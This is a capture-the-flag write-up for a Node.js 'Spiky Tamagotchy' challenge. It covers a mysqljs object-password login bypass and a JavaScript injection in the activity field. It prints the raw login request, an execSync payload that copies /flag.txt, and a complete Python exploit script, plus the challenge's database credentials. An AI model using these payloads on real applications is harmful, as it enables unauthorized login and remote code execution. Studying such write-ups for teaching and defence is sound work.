# Spiky Tamagotchy

> Captain Spiky comes from a rare species of creatures who can only breathe underwater. During the energy-crisis war, he was captured as a war prisoner and later forced to be a Tamagotchi pet for a child of a general of nomadic tribes. He is forced to react in specific ways and controlled remotely purely for the amusement of the general's children. The Paraman crew needs to save the captain of his misery as he is potentially a great asset for the war against Draeger. Can you hack into the Tamagotchi controller to rescue the captain?

---

The target is a Node.js web application.

The flag is at `/flag.txt`.

`challenge/` directory is at `/app`.

`package.json` dependencies:

```json
...
  "dependencies": {
    "cookie-parser": "^1.4.6",
    "express": "^4.17.1",
    "jsonwebtoken": "^8.5.1",
    "mysql": "^2.18.1",
    "nunjucks": "^3.2.0"
  },
  "devDependencies": {
    "nodemon": "^1.19.1"
  }
...
```

## Entrypoint: `index.js`

1. Imports and initializes dependencies:
	- `global.db = new Database()`
	- `nunjucks`
	- `cookieParser`
2. Views configured with `nunjucks`
3. `/static` files initialized
4. Routes initialized with `db`

## 	`database.js`

Definition for `Database` class.

- Constructor establishes connection to MySQL database:
	- Credential: `rh0x01`:`r4yh4nb34t5b1gm4c`
	- Database: `spiky_tamagotchi`
- `registerUser()` `INSERT`s a new user into the database `users` table
	- Never actually called anywhere in the application
- `loginUser()` leverages a `SELECT` statement with `username` and `password` columns of `users` table and is successful if at least one row is returned
	- Leverages `mysqljs`'s [value escaping feature](https://github.com/mysqljs/mysql#escaping-query-values), which escapes the input based on its type
		- This appears to be vulnerable to [SQL injection authentication bypass](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)

## Views

### `index.html`

Login form. Leverages `/static/login.js` for authentication:

```javascript
async function auth() {

	toggleInputs(true); // disable inputs

	// prepare alert
	let card = $("#resp-msg");
	card.attr("class", "alert alert-info");
	card.hide();

	// validate
	let user = $("#username").val();
	let pass = $("#password").val();
	if ($.trim(user) === '' || $.trim(pass) === '') {
		toggleInputs(false);
		card.text("Please input username and password first!");
		card.attr("class", "alert alert-danger");
		card.show();
		return;
	}

	const data = {
		username: user,
		password: pass
	};

	await fetch(`/api/login`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify(data),
		})
		.then((response) => response.json()
			.then((resp) => {
				if (response.status == 200) {
					card.text(resp.message);
					card.attr("class", "alert alert-success");
					card.show();
					window.location.href = '/interface';
					return;
				}
				card.text(resp.message);
				card.attr("class", "alert alert-danger");
				card.show();
			}))
		.catch((error) => {
			card.text(error);
			card.attr("class", "alert alert-danger");
			card.show();
		});

	toggleInputs(false); // enable inputs
}
```

Sends a `POST` to `/api/login` with JSON body with `username` and `password` keys.

### `interface.html`

Interface for interacting with Captain Spiky, the Spiky Tamagotchy. Leverages `/static/interface.js` which defines the `sendActivity()` function for interacting with the tamagotchy through the `/api/actvitiy` endpoint.

```javascript
	const sendActivity = async (activity) => {
    await fetch(`/api/activity`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            activity,
            'health': $('#health').text(),
            'weight': $('#weight').text(),
            'happiness': $('#happiness').text()
        }),
    })
    .then((response) => response.json()
        .then((resp) => {
            if (response.status == 200) {
                $('#health').text(resp.health);
                $('#weight').text(resp.weight);
                $('#happiness').text(resp.happiness);
                window.currentMood = resp.mood;
                return;
            }
        }))
    .catch((error) => {
        console.error(error);
    });
}
```

## API Endpoints

### `GET /`

Renders `index.html`, the login form.

### `POST /api/login`

1. Takes a JSON body with `username` and `password` keys
2. Ensures both are not `null`
3. Leverages `database.js`'s `loginUser()` to ensure at least one user with the specified `username` and `password` exist
4. Leverages `JWTHelper.js`'s `sign()` function to create a JWT whose payload is a JSON object with key `username` whose value is the username of the first user from the result set
5. Sets this JWT as the `session` cookie with a very long lifetime

### `GET /interface`

Renders `interface.html`.

### `POST /api/activity`

1. Takes a JSON body with the following structure:
	- Possible `activity` values are `feed`, `play`, or `sleep`
	- `health`, `weight`, and `happiness` are all string representations of integers

```json
{
	"activity": "feed",
	"health": "1",
	"weight": "2",
	"happiness": "3"
}
```

2. If `activity`, `health`, `weight`, or `happiness` is not defined, return an error
3. Call `SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))`
	- 

## Helpers

### `JWTHelper.js`

#### `sign(data: Object) -> String`

1. Creates a copy of `data`
2. Creates a JWT string whose payload is `data` leveraging the [jsonwebtoken's sign()](https://www.npmjs.com/package/jsonwebtoken#jwtsignpayload-secretorprivatekey-options-callback) and returns the JWT string
	- Algorithm: `HS256`
	- Secret: `APP_SECRET`
		- String of 69 random hex characters generated when `JWTHelper.js` is imported

#### `verify(token: String) -> Object`

Verifies the legitimacy of `token` using [jsonwebtoken's verify()](https://www.npmjs.com/package/jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback), returning the payload object if it was legitimate and throwing an error otherwise.

### `SpikyFactor.js`

#### `calculate()`

Signature:

```javascript
calculate(
	activity: String,
	health: Number,
	weight: Number,
	happiness: Number
) -> Object
```

1. Inserts the `activity`, `health`, `weight`, and `happiness` values into a string `res`:

```javascript
let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
	
	// Adjust health, weight, and happiness based on activity
	if (a == 'feed') {
		hp += 1;
		w += 5;
		hs += 3;
	}
	if (a == 'play') {
		w -= 5;
		hp += 2;
		hs += 3;
	}
	if (a == 'sleep') {
		hp += 2;
		w += 3;
		hs += 3;
	}

	// Adjust health and happiness based on activity and weight
	if ((a == 'feed' || a == 'sleep' ) && w > 70) {
		hp -= 10;
		hs -= 10;
	}
	else if ((a == 'feed' || a == 'sleep' ) && w < 40) {
		hp += 10;
		hs += 5;
	}
	else if (a == 'play' && w < 40) {
		hp -= 10;
		hs -= 10;
	}
	else if ( hs > 70 && (hp < 40 || w < 30)) { 
		hs -= 10;
	}
	
	// Determine mood based on statistics
	if ( hs > 70 ) {
		m = 'kissy'
	}
	else if ( hs < 40 ) {
		m = 'cry'
	}
	else {
		m = 'awkward';
	}
	
	// Fix statistic values
	if ( hs > 100) {
		hs = 100;
	}
	if ( hs < 5) {
		hs = 5;
	}
	if ( hp < 5) {
		hp = 5;
	}
	if ( hp > 100) {
		hp = 100;
	}
	if (w < 10) {
		w = 10
	}

	return {m, hp, w, hs}
}``
```

3. Defines a new function whose body is `res` named `quickMaths()`
4. Executes `quickMaths()`
5. Returns the result in an object with the following structure:
	- `mood` can be `kissy`, `cry`, or `awkward`

```json
{
	"mood": String
	"hp": Number,
	"w": Number,
	"hs": Number
}
```

Due to the way user input is placed into the `res` string which is then used to define a function that is subsequently executed, this endpoint is vulnerable to code injection. By submitting JavaScript code in the `activity` key of the input JSON object that is carefully crafted such that it doesn't cause any syntax errors, it is possible to have the application execute that JavaScript code.

## Strategy

1. [Bypass authentication](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)

```http
POST /api/login HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:1337/
Content-Type: application/json
Origin: http://localhost:1337
Content-Length: 54
Connection: close

{
	"username": "admin",
	"password": {
		"password": 1
	}
}
```

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUzMDE1NjM2fQ.czK8dpNIJbX5Y8EkNDQatGaSNp1lES7IU04E_HXVRgE; Max-Age=3600; Path=/; Expires=Fri, 20 May 2022 04:00:36 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 46
Date: Fri, 20 May 2022 03:00:36 GMT
Connection: close

{"message":"User authenticated successfully!"}
```

3. Craft a JSON body for the `/api/activity` endpoint whose `activity` key contains a JavaScript payload that results in a `res` string with proper syntax

```json
{
	"activity": "', m=(global.process.mainModule.require(\"child_process\").execSync(\"cp /flag.txt /app/static/flag.txt\")), c='woo",
	"health": "50",
	"weight": "50",
	"happiness": "50"
}
```

5. Submit the JSON body to the `/api/activity` endpoint
6. Read the flag from `/static/flag.txt`

The following Python executes this strategy.

```python
import requests


target = "134.209.177.202:32763"
with requests.Session() as session:

    # Login
    response = session.post(
        f"http://{target}/api/login",
        json={
            "username": "admin",
            "password": {"password": 1}
        }
    )
    assert response.status_code == 200

    # Send JavaScript injection payload
    response = session.post(
        f"http://{target}/api/activity",
        json={
            "activity": "', m=(global.process.mainModule.require(\"child_process\").execSync(\"cp /flag.txt /app/static/flag.txt\")), c='woo",
            "health": "50",
            "weight": "50",
            "happiness": "50"
        }
    )
    assert response.status_code == 200

    # Grab the flag
    response = session.get(f"http://{target}/static/flag.txt")
    assert response.status_code == 200
    print(response.text)
```

```bash
$ python3 exploit.py
HTB{...}
```
